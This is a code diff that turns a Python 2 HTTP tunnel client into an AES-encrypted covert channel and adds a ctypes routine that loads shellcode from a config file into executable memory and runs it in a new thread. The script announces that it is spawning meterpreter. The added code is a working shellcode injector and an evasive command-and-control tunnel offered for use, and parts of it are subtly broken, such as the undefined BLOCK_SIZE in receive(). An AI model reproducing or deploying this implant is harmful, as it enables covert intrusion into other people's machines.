@@ -3,20 +3,30 @@ import socket, time
 import httplib, urllib
 from uuid import uuid4
 import threading
-import argparse
+import thread
 import sys
+from Crypto.Cipher import AES
+import base64 
+import ssl
+import multiprocessing
+import ctypes
+from config import user_config
+from config import aes_share
+
+#import test_shell
 
 BUFFER = 1024 * 50
 
 
 class Connection():
     
-    def __init__(self, connection_id, remote_addr, proxy_addr):
+    def __init__(self, connection_id, remote_addr, proxy_addr,aes_secret):
         self.id = connection_id
         conn_dest = proxy_addr if proxy_addr else remote_addr
         print "Establishing connection with remote tunneld at %s:%s" % (conn_dest['host'], conn_dest['port'])
-        self.http_conn = httplib.HTTPConnection(conn_dest['host'], conn_dest['port'])
+        self.http_conn = httplib.HTTPSConnection(conn_dest['host'], conn_dest['port'])
         self.remote_addr = remote_addr
+        self.aes_secret = aes_secret
 
     def _url(self, url):
         return "http://{host}:{port}{url}".format(host=self.remote_addr['host'], port=self.remote_addr['port'], url=url)
@@ -37,6 +47,13 @@ class Connection():
             return False 
 
     def send(self, data):
+        BLOCK_SIZE = 32
+        PADDING = '{'
+        # one-liner to sufficiently pad the text to be encrypted
+        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING        
+        EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
+        data = EncodeAES(self.aes_secret, data)
+        print "Test: " + data
         params = urllib.urlencode({"data": data})
         headers = {"Content-Type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
         try: 
@@ -48,12 +65,16 @@ class Connection():
             print "Error Sending Data: %s" % ex
 
     def receive(self):
+        PADDING = '{'
+        # one-liner to sufficiently pad the text to be encrypted
+        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING        
+        DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
         try: 
             self.http_conn.request("GET", "/" + self.id)
             response = self.http_conn.getresponse()
             data = response.read()
             if response.status == 200:
-                return data
+                return DecodeAES(self.aes_secret,data)
             else: 
                 return None
         except (httplib.HTTPResponse, socket.error) as ex:
@@ -71,14 +92,17 @@ class SendThread(threading.Thread):
     Thread to send data to remote host
     """
     
-    def __init__(self, client, connection):
+    def __init__(self, client, connection,aes_secret):
         threading.Thread.__init__(self, name="Send-Thread")
         self.client = client
         self.socket = client.socket
         self.conn = connection
+        self.aes_secret = aes_secret
         self._stop = threading.Event()
 
     def run(self):
+        
+        
         while not self.stopped():
             print "Getting data from client to send"
             try:
@@ -108,12 +132,13 @@ class ReceiveThread(threading.Thread):
     Thread to receive data from remote host
     """
 
-    def __init__(self, client, connection):
+    def __init__(self, client, connection,aes_secret):
         threading.Thread.__init__(self, name="Receive-Thread")
         self.client = client
         self.socket = client.socket
         self.conn = connection
         self._stop = threading.Event()
+        self.aes_secret = aes_secret
 
     def run(self):
         while not self.stopped():
@@ -134,23 +159,24 @@ class ReceiveThread(threading.Thread):
 
 class ClientWorker(object):
 
-    def __init__(self, socket, remote_addr, target_addr, proxy_addr):
+    def __init__(self, socket, remote_addr, target_addr, proxy_addr,aes_secret):
         #threading.Thread.__init__(self)
         self.socket = socket
         self.remote_addr = remote_addr 
         self.target_addr = target_addr
         self.proxy_addr = proxy_addr
+        self.aes_secret = aes_secret
 
     def start(self):
         #generate unique connection ID
         connection_id = str(uuid4())
         #main connection for create and close
-        self.connection = Connection(connection_id, self.remote_addr, self.proxy_addr)
+        self.connection = Connection(connection_id, self.remote_addr, self.proxy_addr,self.aes_secret)
 
         if self.connection.create(self.target_addr):
-            self.sender = SendThread(self, Connection(connection_id, self.remote_addr, self.proxy_addr)
+            self.sender = SendThread(self, Connection(connection_id, self.remote_addr, self.proxy_addr,self.aes_secret),self.aes_secret
 )
-            self.receiver = ReceiveThread(self, Connection(connection_id, self.remote_addr, self.proxy_addr)
+            self.receiver = ReceiveThread(self, Connection(connection_id, self.remote_addr, self.proxy_addr,self.aes_secret),self.aes_secret
 )
             self.sender.start()
             self.receiver.start()
@@ -169,7 +195,7 @@ class ClientWorker(object):
 
 
 
-def start_tunnel(listen_port, remote_addr, target_addr, proxy_addr):
+def start_tunnel(listen_port, remote_addr, target_addr, proxy_addr,aes_secret):
     """Start tunnel"""
     listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -183,7 +209,7 @@ def start_tunnel(listen_port, remote_addr, target_addr, proxy_addr):
             c_sock, addr = listen_sock.accept() 
             c_sock.settimeout(20)
             print "connected by ", addr
-            worker = ClientWorker(c_sock, remote_addr, target_addr, proxy_addr)
+            worker = ClientWorker(c_sock, remote_addr, target_addr, proxy_addr,aes_secret)
             workers.append(worker)
             worker.start()
     except (KeyboardInterrupt, SystemExit):
@@ -194,18 +220,45 @@ def start_tunnel(listen_port, remote_addr, target_addr, proxy_addr):
             w.join()
         sys.exit()
 
+
+
+def inject(shellcode):
+# special thanks to Debasish Mandal (http://www.debasish.in/2012_04_01_archive.html)
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+    ctypes.c_int(len(shellcode)),
+    ctypes.c_int(0x3000),
+    ctypes.c_int(0x40))
+    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
+    ctypes.c_int(len(shellcode)))
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+    buf,
+    ctypes.c_int(len(shellcode)))
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.c_int(ptr),
+    ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.pointer(ctypes.c_int(0)))
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+
 if __name__ == "__main__":
-    """Parse argument from command line and start tunnel"""
 
-    parser = argparse.ArgumentParser(description='Start Tunnel')
-    parser.add_argument('-p', default=8889, dest='listen_port', help='Port the tunnel listens to, (default to 8889)', type=int)
-    parser.add_argument('target', metavar='Target Address', help='Specify the host and port of the target address in format Host:Port')
-    parser.add_argument('-r', default='localhost:9999', dest='remote', help='Specify the host and port of the remote server to tunnel to (Default to localhost:9999)')
-    parser.add_argument('-o', default='', dest='proxy', help='Specify the host and port of the proxy server(host:port)')
+#set aes secret
+    cipher = AES.new(aes_share.secret)
 
-    args = parser.parse_args()
+#launch shellcode
+#launch shellcode
+    t = threading.Thread(target=inject, args=(user_config.shellcode,))
+    t.start()     
+    #p = multiprocessing.Process(target=inject, args=(user_config.shellcode,))
+    print "[*] Spawning meterpreter on localhost on port: 8021"
+    #jobs = []
+    #jobs.append(p)
+    #p.start()    
 
-    target_addr = {"host": args.target.split(":")[0], "port": args.target.split(":")[1]}
-    remote_addr = {"host": args.remote.split(":")[0], "port": args.remote.split(":")[1]}
-    proxy_addr = {"host": args.proxy.split(":")[0], "port": args.proxy.split(":")[1]} if (args.proxy) else {}
-    start_tunnel(args.listen_port, remote_addr, target_addr, proxy_addr)
+    start_tunnel(user_config.listen_port, user_config.remote_addr, user_config.target_addr, user_config.proxy_addr,cipher)
+
+
+
+
